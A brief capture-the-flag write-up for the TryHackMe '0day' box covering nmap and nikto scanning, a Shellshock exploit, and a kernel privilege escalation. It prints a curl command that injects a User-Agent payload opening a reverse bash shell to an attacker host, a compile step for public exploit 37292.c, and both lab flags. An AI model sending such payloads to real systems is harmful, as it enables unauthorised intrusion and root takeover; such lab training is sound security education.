# Introduction

0day is a medium box on the TryHackMe platform. The box involves exploiting a website with shellshock and exploiting an outdated linux kernel

Scanning

To start our enumeration of the box we do an initial nmap scan. Using -sC for default scripts, -sV for version enumeration and -oA to output the results 

![2025-04-03_04-09](https://github.com/user-attachments/assets/3d03499b-4e54-43b1-8128-23829df30532)

The results of this nmap show 2 ports open:

port 80 which is a HTTP server.
Port 22 which is a SSH service

Our next step is to look into the HTTP server. Navigating there in the browser shows a site which looks like Ryan's portfolio page.
![image](https://github.com/user-attachments/assets/f2521554-1f6d-47f6-9d1a-d328cb8e40c7)

let’s enumerate this website and see what we can find

![image](https://github.com/user-attachments/assets/6225c5e3-abdf-4513-9802-4d4cd97afde6)

![image](https://github.com/user-attachments/assets/2fa14f5f-779b-4bb8-ab73-516e74ce3e87)

sudo nikto -h {target_ip}

![image](https://github.com/user-attachments/assets/0506f4cf-4705-4f83-827a-216d20bd8892)

curl –H ‘User-Agent: () { :;}; echo; echo; /bin/bash –i >& /dev/tcp/<attacker-ip>/4444 0>&1 ’ bash –s : ‘’ http://<ip-of-the-victim>/cgi-bin/test.cgi

![image](https://github.com/user-attachments/assets/2dc9944c-25ac-4ab8-bf90-88078ca9b52f)

![image](https://github.com/user-attachments/assets/f03f3400-be54-4e9d-adc4-3e3fa3fb7169)

THM{Sh3llSh0ck_r0ckz}

Privilege Escalation

![image](https://github.com/user-attachments/assets/b61c9c8e-9179-40fe-9b13-6783de7bd675)

![image](https://github.com/user-attachments/assets/33026a40-2a21-4c3e-913d-844fc57aa828)

![image](https://github.com/user-attachments/assets/99d7b487-dd66-4cad-980c-c91f0194b686)

![image](https://github.com/user-attachments/assets/1518b546-ea02-4ac6-a457-8064d1d6b11f)

export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin

gcc 37292.c -o 3

![image](https://github.com/user-attachments/assets/29a2299d-ca42-40f4-b470-e230883698dc)

we got root access

![image](https://github.com/user-attachments/assets/f416d31a-20c9-4e59-a433-b26d1b4f9520)

THM{g00d_j0b_0day_is_Pleased}











